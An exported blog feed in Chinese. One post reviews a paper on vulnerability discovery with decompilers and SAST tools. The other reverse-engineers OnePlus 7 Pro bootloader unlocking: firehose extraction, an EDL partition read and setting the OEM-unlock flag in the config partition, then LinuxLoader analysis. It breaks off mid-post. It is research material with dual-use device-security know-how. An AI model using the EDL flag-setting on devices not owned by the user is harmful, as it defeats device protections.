<span id="more"></span>

<p>   我们这做主要是因为一些不可说的原因，最开始是<code>@C0ss4ck</code>搞的用IDAPython搞的工具，但是由于做适配比较麻烦不够灵活；后来我提出了<code>decompiler+weggli</code>的做法的时候，我们都不是那么的看好，但是搞了一些demo发现确实可行，对于一些简单的漏洞模型是可以召回的，主要的瓶颈就在decompile code的质量和规则的编写了，同时由于weggli本身不支持数据流，并且主要是过程内的漏洞模式匹配(AST regexp)，所以后面就又面临瓶颈的问题了；在我做调研的时候，发现了这篇新鲜的论文，在读完之后感触良多，对<code>decompiler+SAST</code>的做法也有了更多的理解。</p>
<h2 id="Read-this-PAPER"><a href="#Read-this-PAPER" class="headerlink" title="Read this PAPER"></a>Read this <code>PAPER</code></h2><p>  这篇论文讨论了源码/伪代码+SAST工具在漏洞挖掘上的效果，以及对于<code>伪代码+SAST</code>这种模式的局限性的探究，对其中的误报&amp;漏报根本原因的分析。 </p>
<h3 id="关于论文中的实验设计"><a href="#关于论文中的实验设计" class="headerlink" title="关于论文中的实验设计"></a>关于论文中的实验设计</h3><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912140406820.png" alt="image-20220912140406820"></p>
<ol>
<li>源码直接使用 SAST 工具</li>
<li>多种decompiler反编译之后获取伪代码，丢给SAST工具</li>
<li>伪代码修正之后(达到可编译的程度，有些复杂目标要裁剪)，给SAST工具用</li>
</ol>
<h3 id="工具-amp-目标选择"><a href="#工具-amp-目标选择" class="headerlink" title="工具 &amp; 目标选择"></a>工具 &amp; 目标选择</h3><blockquote>
<p>   尝试召回 real world vulns</p>
</blockquote>
<p>基本上都是优秀的工具，其中两款商业工具并没有写具体是啥，但是这个 <code>Comm_1</code>看起来好像Coverity :) 不管怎么样，其中的 <code>codeql</code>和<code>joern</code>我很感兴趣，毕竟可以自定义规则，这对我来说无疑是更好的，可以召回更多问题 &amp; 适用于更多的场景。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912141551810.png" alt="image-20220912141551810"></p>
<p>对于漏洞的选择，该论文也选的比较广泛，各种类型都有，复杂度也够，可以更好的“测量”这些工具 :)</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912142030762.png" alt="image-20220912142030762"></p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><ol>
<li><p>  反编译代码并不是开箱即用的</p>
</li>
<li><p>  对于二进制文件，<code>伪代码+SAST</code>的模式可行，但是有限</p>
</li>
<li><p><code>SAST</code>工具设计上是给源码用的，这是<code>by design</code>的；二进制文件丢失了关键信息(尤其是编译器优化的影响)，不适合给<code>SAST</code>工具做分析，这也是为什么论文中说不用LLVM Lifter的原因</p>
<blockquote>
<p>  decompilers are still designed to generate code that is easy to understand for humans, and SAST tools are still designed to parse “well-written” code that is not generated by a machine.</p>
</blockquote>
</li>
<li><p>  <strong>编译器优化很有意思，有些漏洞因为优化inline，所以从过程间–&gt;过程内，decompile之后的代码反而找到了漏洞 :)</strong></p>
</li>
</ol>
<blockquote>
<p>优化的话， 两个思路，相当于朝着同一个方向前进的路:</p>
</blockquote>
<ol>
<li>提高反编译代码的质量</li>
<li>优化<code>SAST</code>工具，让其适配反编译的代码</li>
</ol>
<h3 id="漏报-amp-误报-Root-cause"><a href="#漏报-amp-误报-Root-cause" class="headerlink" title="漏报 &amp; 误报 Root cause"></a>漏报 &amp; 误报 Root cause</h3><blockquote>
<p>  个人认为比较核心的地方了</p>
</blockquote>
<h4 id="P1-Inability-to-Recover-the-Size-of-Stack-Buffers"><a href="#P1-Inability-to-Recover-the-Size-of-Stack-Buffers" class="headerlink" title="P1 - Inability to Recover the Size of Stack Buffers"></a>P1 - Inability to Recover the Size of Stack Buffers</h4><p>经过编译优化，下面的代码中s1由于是指向了为初始化内存，所以可能会报告成栈溢出</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912142153011.png" alt="image-20220912142153011"><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912142204926.png" alt="image-20220912142204926"></p>
<p>说是这样说，但是我个人认为，这种情况是可以避免的，通过汇编是可以判断出来这个 stack buffer 有多大，这种误报理论上是可以排出的，前提是收集更多的信息 &lt;– 优化项</p>
<h4 id="P2-Signed-and-Unsigned-Integers"><a href="#P2-Signed-and-Unsigned-Integers" class="headerlink" title="P2 - Signed and Unsigned Integers"></a>P2 - Signed and Unsigned Integers</h4><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912142520350.png" alt="image-20220912142520350"></p>
<p>没什么好说的，变量类型分析错误，在对伪代码中产生误报正常，这个如果不人为干预，确实没办法</p>
<h4 id="P3-Integer-Operations-on-Uninitialized-Variables"><a href="#P3-Integer-Operations-on-Uninitialized-Variables" class="headerlink" title="P3 - Integer Operations on Uninitialized Variables"></a>P3 - Integer Operations on Uninitialized Variables</h4><p>由于缺少必要的信息，导致在 <code>sub 129CF</code>丢失了a2和a4的信息，导致SAST工具产生误报</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912142633914.png" alt="image-20220912142633914"></p>
<h4 id="P4-Function-Pointers"><a href="#P4-Function-Pointers" class="headerlink" title="P4 - Function Pointers"></a>P4 - Function Pointers</h4><p>函数指针问题，这个很巧合，前两天请教<code>@jmpews</code>的时候，提到了decompiler+SAST的做法，当时我问的是 <code>joern</code>，大佬的说法是C更不好整， <code>c++ 还可以走 demangle</code></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912142958000.png" alt="image-20220912142958000"></p>
<p>上面的代码反编译之后得到:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912143018996.png" alt="image-20220912143018996"></p>
<p>基本上是无法分析的，就算是人肉逆向，也要重建这个结构体，然后转换变量类型，自动化不太现实，这块的误报确实没办法</p>
<h4 id="P5-Pointers-as-Integers"><a href="#P5-Pointers-as-Integers" class="headerlink" title="P5 - Pointers as Integers"></a>P5 - Pointers as Integers</h4><p>还是变量类型的问题，反编译代码对特定变量类型分析错误，导致的误报</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912143157818.png" alt="image-20220912143157818"></p>
<p>反编译之后:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912143214154.png" alt="image-20220912143214154"></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912143233125.png" alt="image-20220912143233125"></p>
<h4 id="P6-Integers-of-Wrong-Size"><a href="#P6-Integers-of-Wrong-Size" class="headerlink" title="P6 - Integers of Wrong Size"></a>P6 - Integers of Wrong Size</h4><p>对v22 和 v26 类型识别错误，混用了 <code>uint8_t</code> 和 <code>int64</code>，所以可能会误报整数溢出 :(</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912143334876.png" alt="image-20220912143334876"></p>
<h4 id="P7-Simplified-Expressions"><a href="#P7-Simplified-Expressions" class="headerlink" title="P7 - Simplified Expressions"></a>P7 - Simplified Expressions</h4><p>这是一类特殊情况</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912143520029.png" alt="image-20220912143520029"></p>
<p>这里显然把<code>||</code>和<code>&amp;&amp;</code>搞混了，但是反编译之后</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220912143546104.png" alt="image-20220912143546104"></p>
<p>这类表达式在编译器优化处理之后，再反编译，该表达式已经看不出来了，就会漏报这个问题 :(</p>
<h2 id="Futher-work"><a href="#Futher-work" class="headerlink" title="Futher work"></a>Futher work</h2><p><code>decompiler+SAST</code>可行，但是需要优化，能覆盖的场景也有限，目前来看IoT场景是比较适合的，比如各种奇葩的命令注入，显然是可以召回的。</p>
<ol>
<li>  最好不要选依赖编译的SAST工具，如codeql</li>
<li>  选择可以自定义规则的工具</li>
<li>  最好可以支持过程间分析、数据流</li>
<li>  为了弥补反编译代码的不足，可以结合汇编层面收集一些信息，比如栈上变量的大小</li>
</ol>
<blockquote>
<p>  个人来一个大胆的构想，从ctree上收集信息，生成codeql那样的rel db，目前来看比较接近的是joern，但是它是基于ghirda，优化空间还是有的。</p>
</blockquote>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://dl.acm.org/doi/10.1145/3488932.3497764">https://dl.acm.org/doi/10.1145/3488932.3497764</a></p>
<p><a href="https://security.humanativaspa.it/automating-binary-vulnerability-discovery-with-ghidra-and-semgrep/">https://security.humanativaspa.it/automating-binary-vulnerability-discovery-with-ghidra-and-semgrep/</a></p>
<p><a href="https://docs.joern.io/home">https://docs.joern.io/home</a></p>
]]></content>
      <categories>
        <category>论文阅读</category>
      </categories>
      <tags>
        <tag>Paper</tag>
      </tags>
  </entry>
  <entry>
    <title>Qual+Android方案Unlock学习 以Oneplus7Pro为例</title>
    <url>/2022/11/01/Qual-Android%E6%96%B9%E6%A1%88Unlock%E5%AD%A6%E4%B9%A0-%E4%BB%A5Oneplus7Pro%E4%B8%BA%E4%BE%8B/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>  严格意义上来说本文应该叫做: &lt;&lt;我本来只是想救个砖，但是却逆向了刷机工具尝试搞清楚<code>android unlock</code>的原理&gt;&gt; :D </p>
<span id="more"></span>

<p>前段时间因为一些工作需求想给手里的测试机(一加7Pro)刷个ColorOS，因为之前想体验Android12，机器是刷了个userdebug的lineageos，遂尝试了卡刷、sideload等之后机器被我搞坏了，开机直接recovery，报错信息是什么 mount fs的时候失败了 :( 没办法只能救转了，逛了一圈论坛发现有人提供<a href="https://www.oneplusbbs.com/forum.php?mod=viewthread&tid=4730052">9008刷机工具</a>，通过万能的9008救回来之后，我就想做点别的: 把他的firehose“偷”出来玩玩。</p>
<h2 id="Unpack-guacamole-21-H-04-190416-ops"><a href="#Unpack-guacamole-21-H-04-190416-ops" class="headerlink" title="Unpack guacamole_21_H.04_190416.ops"></a>Unpack guacamole_21_H.04_190416.ops</h2><p>刷机工具解压之后就几个文件，一个刷机工具 msmdownloadtoolv4.0.88，还有个<code>guacamole_21_H.04_190416.ops</code>，一看就是固件包，然后就是一些完整性校验用的文件。</p>
<p>根据经验，这类刷机包里应该是内置了firehouse的，可以考虑两条路：</p>
<ol>
<li>  解包，直接把firehose提出来</li>
<li>  内存dump，在刷机工具尝试给手机传输firehose的时候的时候内存dump，从内存里根据ELF文件头给截出来</li>
</ol>
<p>方法2是我最开始尝试的办法，但是dump了几次，发现了好几个ELF，但是都不对，所以尝试方法1 :D 很显然这个包是厂商自己搞得加密，不过网上已经有大佬分析了(早用方法1就少走弯路了)，所以根据 <a href="https://www.droidwin.com/how-to-extract-oneplus-ops-firmware/">How to Extract/Decrypt OnePlus OPS Firmware</a> 提供的工具，可以成功吧固件包解开，获取到firehose</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookAir in ~/Work/play_with_oneplus7pro on git:main x [22:01:37]</span></span><br><span class="line">$ ls -al prog_firehose_*</span><br><span class="line">-rw-r--r--@ 1 muhe  staff  726400 Oct 28 22:46 prog_firehose_ddr.elf</span><br><span class="line">-rw-r--r--@ 1 muhe  staff  726272 Oct 28 22:46 prog_firehose_lite.elf</span><br></pre></td></tr></table></figure>

<p>随便试了一把读分区，是可以的，说明firehose是没问题的 :)</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221102220307918.png" alt="image-20221102220307918"></p>
<p>然后就想着顺手看点别的，研究研究Qual+Android平台的解锁BL是怎么实现的，遂有了后续的过程。</p>
<h2 id="Unlock探究"><a href="#Unlock探究" class="headerlink" title="Unlock探究"></a>Unlock探究</h2><h3 id="开发者选项–允许解锁"><a href="#开发者选项–允许解锁" class="headerlink" title="开发者选项–允许解锁"></a>开发者选项–允许解锁</h3><blockquote>
<p>   参考android-9-r1， 因为现在用的一加的系统的是Android9的</p>
</blockquote>
<blockquote>
<p>  没在开发这里允许解锁BL的话，直接fastboot oem unlock是不行的</p>
</blockquote>
<ol>
<li> onOemUnlockConfirmed</li>
</ol>
<p><a href="https://cs.android.com/android/platform/superproject/+/android-9.0.0_r1:packages/apps/Settings/src/com/android/settings/development/OemUnlockPreferenceController.java;l=132">https://cs.android.com/android/platform/superproject/+/android-9.0.0_r1:packages/apps/Settings/src/com/android/settings/development/OemUnlockPreferenceController.java;l=132</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onOemUnlockConfirmed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    mOemLockManager.setOemUnlockAllowedByUser(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li> setOemUnlockAllowedByUser</li>
</ol>
<p><a href="https://cs.android.com/android/platform/superproject/+/android-9.0.0_r1:frameworks/base/core/java/android/service/oemlock/OemLockManager.java;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=114">https://cs.android.com/android/platform/superproject/+/android-9.0.0_r1:frameworks/base/core/java/android/service/oemlock/OemLockManager.java;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=114</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequiresPermission(android.Manifest.permission.MANAGE_USER_OEM_UNLOCK_STATE)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setOemUnlockAllowedByUser</span><span class="params">(<span class="keyword">boolean</span> allowed)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mService.setOemUnlockAllowedByUser(allowed);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e.rethrowFromSystemServer();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li> setOemUnlockAllowedByUser</li>
</ol>
<p><a href="https://cs.android.com/android/platform/superproject/+/android-9.0.0_r1:frameworks/base/services/core/java/com/android/server/oemlock/OemLockService.java;l=156;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">https://cs.android.com/android/platform/superproject/+/android-9.0.0_r1:frameworks/base/services/core/java/com/android/server/oemlock/OemLockService.java;l=156;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The user has the final say so if they allow unlock, then the device allows the bootloader</span></span><br><span class="line"><span class="comment">// to OEM unlock it.</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setOemUnlockAllowedByUser</span><span class="params">(<span class="keyword">boolean</span> allowedByUser)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ActivityManager.isUserAMonkey()) &#123;</span><br><span class="line">        <span class="comment">// Prevent a monkey from changing this</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    enforceManageUserOemUnlockPermission();</span><br><span class="line">    enforceUserIsAdmin();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">long</span> token = Binder.clearCallingIdentity();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isOemUnlockAllowedByAdmin()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(<span class="string">&quot;Admin does not allow OEM unlock&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!mOemLock.isOemUnlockAllowedByCarrier()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(<span class="string">&quot;Carrier does not allow OEM unlock&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mOemLock.setOemUnlockAllowedByDevice(allowedByUser);</span><br><span class="line">        setPersistentDataBlockOemUnlockAllowedBit(allowedByUser);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        Binder.restoreCallingIdentity(token);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li> setPersistentDataBlockOemUnlockAllowedBit</li>
</ol>
<p><a href="https://cs.android.com/android/platform/superproject/+/android-9.0.0_r1:frameworks/base/services/core/java/com/android/server/oemlock/OemLockService.java;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=232">https://cs.android.com/android/platform/superproject/+/android-9.0.0_r1:frameworks/base/services/core/java/com/android/server/oemlock/OemLockService.java;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=232</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Always synchronize the OemUnlockAllowed bit to the FRP partition, which</span></span><br><span class="line"><span class="comment"> * is used to erase FRP information on a unlockable device.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setPersistentDataBlockOemUnlockAllowedBit</span><span class="params">(<span class="keyword">boolean</span> allowed)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> PersistentDataBlockManagerInternal pdbmi</span><br><span class="line">            = LocalServices.getService(PersistentDataBlockManagerInternal.class);</span><br><span class="line">    <span class="comment">// if mOemLock is PersistentDataBlockLock, then the bit should have already been set</span></span><br><span class="line">    <span class="keyword">if</span> (pdbmi != <span class="keyword">null</span> &amp;&amp; !(mOemLock <span class="keyword">instanceof</span> PersistentDataBlockLock)) &#123;</span><br><span class="line">        Slog.i(TAG, <span class="string">&quot;Update OEM Unlock bit in pst partition to &quot;</span> + allowed);</span><br><span class="line">        pdbmi.forceOemUnlockEnabled(allowed);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li> pdbmi.forceOemUnlockEnabled(allowed);</li>
</ol>
<p><a href="https://cs.android.com/android/platform/superproject/+/android-9.0.0_r1:frameworks/base/services/core/java/com/android/server/PersistentDataBlockService.java;l=677;bpv=0;bpt=1">https://cs.android.com/android/platform/superproject/+/android-9.0.0_r1:frameworks/base/services/core/java/com/android/server/PersistentDataBlockService.java;l=677;bpv=0;bpt=1</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">forceOemUnlockEnabled</span><span class="params">(<span class="keyword">boolean</span> enabled)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (mLock) &#123;</span><br><span class="line">        doSetOemUnlockEnabledLocked(enabled);</span><br><span class="line">        computeAndWriteDigestLocked();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li> doSetOemUnlockEnabledLocked</li>
</ol>
<p><a href="https://cs.android.com/android/platform/superproject/+/android-9.0.0_r1:frameworks/base/services/core/java/com/android/server/PersistentDataBlockService.java;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=421">https://cs.android.com/android/platform/superproject/+/android-9.0.0_r1:frameworks/base/services/core/java/com/android/server/PersistentDataBlockService.java;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1;l=421</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doSetOemUnlockEnabledLocked</span><span class="params">(<span class="keyword">boolean</span> enabled)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        FileChannel channel = getBlockOutputChannel();</span><br><span class="line">    </span><br><span class="line">        channel.position(getBlockDeviceSize() - <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">        ByteBuffer data = ByteBuffer.allocate(<span class="number">1</span>);</span><br><span class="line">        data.put(enabled ? (<span class="keyword">byte</span>) <span class="number">1</span> : (<span class="keyword">byte</span>) <span class="number">0</span>);</span><br><span class="line">        data.flip();</span><br><span class="line">        channel.write(data);</span><br><span class="line">        channel.force(<span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        Slog.e(TAG, <span class="string">&quot;unable to access persistent partition&quot;</span>, e);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        SystemProperties.set(OEM_UNLOCK_PROP, enabled ? <span class="string">&quot;1&quot;</span> : <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设备文件的某个位置写1，看起来是修改配置了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String PERSISTENT_DATA_BLOCK_PROP = <span class="string">&quot;ro.frp.pst&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>在一加上看是 :</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">130</span>|OnePlus7Pro:/ $ getprop ro.frp.pst</span><br><span class="line">/dev/block/bootdevice/by-name/config</span><br></pre></td></tr></table></figure>

<p>那么操作就是写这个分区了，把enbale标志位写进去，尝试进edl把config读出来看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Admin&gt; adb reboot edl</span><br><span class="line">PS C:\Users\Admin&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221102220543055.png" alt="image-20221102220543055"></p>
<p>设置了这个标志位之后：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221102220559725.png" alt="image-20221102220559725"></p>
<p>发现设备已经是允许unlock操作了(这里的允许是允许你去 <code>fastboot oem unlock</code>)</p>
<h3 id="fastboot-oem-unlock"><a href="#fastboot-oem-unlock" class="headerlink" title="fastboot oem unlock"></a>fastboot oem unlock</h3><h4 id="extract-LinuxLoader-from-abl"><a href="#extract-LinuxLoader-from-abl" class="headerlink" title="extract LinuxLoader from abl"></a>extract LinuxLoader from abl</h4><ol>
<li><p>  把<code>UEFI PI Firmware Volume</code>从abl.elf里切出来</p>
</li>
<li><p>  uefi-firmware-parser 解析</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ uefi-firmware-parser -e test</span><br><span class="line">/usr/local/bin/uefi-firmware-parser:38: SyntaxWarning: &quot;is not&quot; with a literal. Did you mean &quot;!=&quot;?</span><br><span class="line">  if parser.type() is not &#x27;unknown&#x27;:</span><br><span class="line">/usr/local/bin/uefi-firmware-parser:141: SyntaxWarning: &quot;is&quot; with a literal. Did you mean &quot;==&quot;?</span><br><span class="line">  if parser.type() is &#x27;unknown&#x27;:</span><br><span class="line">Firmware Volume: 8c8ce578-8a3d-4f1c-9935-896185c32dd3 attr 0x0003feff, rev 2, cksum 0xd3be, size 0x22000 (139264 bytes)</span><br><span class="line">  Firmware Volume Blocks: (272, 0x200)</span><br><span class="line">  File 0: 9e21fd93-9c72-4c15-8c4b-e77f1db2d792 type 0x0b, attr 0x00, state 0x07, size 0x204c2 (132290 bytes), (firmware volume image)</span><br><span class="line">    Section 0: type 0x02, size 0x204aa (132266 bytes) (Guid Defined section)</span><br><span class="line">      Guid-Defined: ee4e5898-3914-4259-9d6e-dc7bd79403cf offset= 0x18 attrs= 0x1 (PROCESSING_REQUIRED)</span><br><span class="line">        Section 0: type 0x19, size 0x4 (4 bytes) (Raw section)</span><br><span class="line">        Section 1: type 0x17, size 0x6d0c4 (446660 bytes) (Firmware volume image section)</span><br><span class="line">          Firmware Volume: 8c8ce578-8a3d-4f1c-9935-896185c32dd3 attr 0x0003feff, rev 2, cksum 0xa27, size 0x6d0c0 (446656 bytes)</span><br><span class="line">            Firmware Volume Blocks: (6979, 0x40)</span><br><span class="line">            File 0: ffffffff-ffff-ffff-ffff-ffffffffffff type 0xf0, attr 0x00, state 0x07, size 0x2c (44 bytes), (ffs padding)</span><br><span class="line">            File 1: f536d559-459f-48fa-8bbc-43b554ecae8d type 0x09, attr 0x00, state 0x07, size 0x6d038 (446520 bytes), (application)</span><br><span class="line">              Section 0: type 0x15, size 0x1c (28 bytes) (User interface name section)</span><br><span class="line">              Name: LinuxLoader</span><br><span class="line">              Section 1: type 0x10, size 0x6d004 (446468 bytes) (PE32 image section)</span><br><span class="line">Dumping...</span><br><span class="line">Wrote: ./volume-0.fv</span><br><span class="line">Wrote: ./volume-0/filesystem.ffs</span><br><span class="line">Wrote: ./volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/file.obj</span><br><span class="line">Wrote: ./volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0.guid</span><br><span class="line">Wrote: ./volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0/section0.raw</span><br><span class="line">Wrote: ./volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0/section1.fv</span><br><span class="line">Wrote: ./volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0/section1/volume-ee4e5898-3914-4259-9d6e-dc7bd79403cf.fv</span><br><span class="line">Wrote: ./volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0/section1/volume-ee4e5898-3914-4259-9d6e-dc7bd79403cf/filesystem.ffs</span><br><span class="line">Wrote: ./volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0/section1/volume-ee4e5898-3914-4259-9d6e-dc7bd79403cf/file-ffffffff-ffff-ffff-ffff-ffffffffffff/file.obj</span><br><span class="line">Wrote: ./volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0/section1/volume-ee4e5898-3914-4259-9d6e-dc7bd79403cf/file-f536d559-459f-48fa-8bbc-43b554ecae8d/file.obj</span><br><span class="line">Wrote: ./volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0/section1/volume-ee4e5898-3914-4259-9d6e-dc7bd79403cf/file-f536d559-459f-48fa-8bbc-43b554ecae8d/section0.ui</span><br><span class="line">Wrote: ./volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0/section1/volume-ee4e5898-3914-4259-9d6e-dc7bd79403cf/file-f536d559-459f-48fa-8bbc-43b554ecae8d/section1.pe</span><br><span class="line">Wrote: ./volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0/guided.preamble</span><br><span class="line">Wrote: ./volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0/guided.certs</span><br></pre></td></tr></table></figure>



<p><code>./volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0/section1/volume-ee4e5898-3914-4259-9d6e-dc7bd79403cf/file-f536d559-459f-48fa-8bbc-43b554ecae8d/section1.pe </code> 就是我们需要的LinuxLoader</p>
<h4 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h4><blockquote>
<p>   这算是UEFI的一个应用程序</p>
</blockquote>
<p>然后就去找 fastboot oem unlock 对应的处理逻辑 : </p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221102221112067.png" alt="image-20221102221112067"></p>
<p>如果没有在设置-开发者选项中点击允许解锁BL，直接oem unlock是不行的，</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221102221127781.png" alt="image-20221102221127781"></p>
<p>在abl中也找到了对应的报错信息:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221102221145363.png" alt="image-20221102221145363"></p>
<p>这里没符号不太好理解，要么找edk2的源码做参考辅助分析，要么某个基线代码build一份带符号的abl出来，这里因为没有在设置中 “允许解锁boot loader” 所以可以结合上面AOSP中的代码做辅助分析。</p>
<p>看看LinuxLoader的源码会更好理解</p>
<p>这里其实是判断了两个标志位:</p>
<ul>
<li>  unlock: 解锁，不验证BL了</li>
<li>  unlock_critical: 设置后了之后才能刷对应的敏感分区</li>
</ul>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221102221215657.png" alt="image-20221102221215657"></p>
<p>edk2开源实现中默认的保护分区，这个是可以修改的</p>
<p>结合LinuxLoader的源码，网上可以找到一些leak的实现，能用于辅助分析</p>
<p>在入口 <code>LinuxLoaderEntry</code> 开始的时候，会初始化一个Deviceinfo的结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Initialize verified boot &amp; Read Device Info</span></span><br><span class="line">Status = DeviceInfoInit ();</span><br><span class="line"><span class="keyword">if</span> (Status != EFI_SUCCESS) &#123;</span><br><span class="line">  DEBUG ((EFI_D_ERROR, <span class="string">&quot;Initialize the device info failed: %r\\n&quot;</span>, Status));</span><br><span class="line">  <span class="keyword">goto</span> stack_guard_update_default;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结构体如下:</p>
